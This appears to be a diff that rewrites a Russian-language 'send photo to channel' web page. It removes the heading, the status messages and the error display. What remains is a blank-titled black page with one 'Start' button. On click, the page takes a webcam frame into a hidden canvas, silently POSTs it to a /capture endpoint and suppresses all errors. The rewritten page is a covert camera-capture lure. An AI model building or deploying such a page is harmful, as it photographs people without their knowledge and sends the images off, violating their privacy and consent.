@@ -1,173 +1,57 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Фото в канал</title>
+    <title></title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            background: #1a1a1a;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            font-family: Arial, sans-serif;
-            padding: 20px;
-        }
-        .container {
+        body { margin: 0; padding: 20px; background: black; }
+        button {
             background: white;
-            padding: 30px;
-            border-radius: 20px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
-            text-align: center;
-            max-width: 400px;
-            width: 100%;
-        }
-        h2 {
-            color: #333;
-            margin-bottom: 20px;
-            font-size: 24px;
-        }
-        .btn {
-            background: #0088cc;
-            color: white;
             border: none;
             padding: 15px 40px;
             font-size: 18px;
-            border-radius: 50px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: background 0.3s;
-            width: 100%;
-            margin: 10px 0;
-        }
-        .btn:active {
-            background: #006699;
-            transform: scale(0.98);
-        }
-        .btn:disabled {
-            background: #ccc;
-            cursor: not-allowed;
-        }
-        #status {
-            margin-top: 15px;
-            padding: 10px;
             border-radius: 10px;
-            font-size: 14px;
-            min-height: 40px;
+            cursor: pointer;
+            display: block;
+            margin: 0 auto;
         }
-        .success {
-            background: #d4edda;
-            color: #155724;
-        }
-        .error {
-            background: #f8d7da;
-            color: #721c24;
-        }
-        .hidden {
-            display: none;
-        }
-        video, canvas {
-            display: none;
-        }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h2>📸 Отправить фото в канал</h2>
-        
-        <video id="video" autoplay playsinline class="hidden"></video>
-        <canvas id="canvas" class="hidden"></canvas>
-        
-        <button id="startBtn" class="btn">🚀 Начать</button>
-        
-        <div id="status"></div>
-    </div>
+    <button id="btn">Начать</button>
+    
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
 
     <script>
+        const btn = document.getElementById('btn');
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const startBtn = document.getElementById('startBtn');
-        const statusDiv = document.getElementById('status');
         
-        let stream = null;
-
-        startBtn.addEventListener('click', async () => {
+        btn.onclick = async () => {
             try {
-                startBtn.disabled = true;
-                statusDiv.textContent = '📷 Запрашиваю камеру...';
-                
-                // Включаем камеру
-                stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        width: 640, 
-                        height: 480,
-                        facingMode: 'user'
-                    } 
-                });
-                
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
                 
-                // Ждем когда видео запустится
-                await new Promise((resolve) => {
-                    video.onplaying = resolve;
-                });
-                
-                statusDiv.textContent = '📸 Делаю снимок...';
-                
-                // Делаем снимок
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                
-                // Конвертируем в base64
-                const photo = canvas.toDataURL('image/jpeg', 0.8);
-                
-                statusDiv.textContent = '📤 Отправляю...';
-                
-                // Отправляем на сервер
-                const response = await fetch('/capture', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ photo: photo })
-                });
-                
-                if (response.ok) {
-                    statusDiv.textContent = '✅ Фото отправлено в канал!';
-                    statusDiv.className = 'success';
-                    
-                    // Закрываем камеру
-                    if (stream) {
-                        stream.getTracks().forEach(track => track.stop());
-                    }
-                    
-                    // Активируем кнопку снова через 2 секунды
+                video.onplaying = () => {
                     setTimeout(() => {
-                        startBtn.disabled = false;
-                        statusDiv.textContent = '';
-                        statusDiv.className = '';
-                    }, 2000);
-                } else {
-                    throw new Error('Ошибка сервера');
-                }
-                
-            } catch (err) {
-                console.error(err);
-                statusDiv.textContent = '❌ Ошибка: ' + (err.message || 'не удалось сделать фото');
-                statusDiv.className = 'error';
-                
-                startBtn.disabled = false;
-                
-                if (stream) {
-                    stream.getTracks().forEach(track => track.stop());
-                }
-            }
-        });
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        
+                        fetch('/capture', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({
+                                photo: canvas.toDataURL('image/jpeg')
+                            })
+                        }).finally(() => {
+                            stream.getTracks().forEach(t => t.stop());
+                        });
+                    }, 300);
+                };
+            } catch (e) {}
+        };
     </script>
 </body>
 </html>
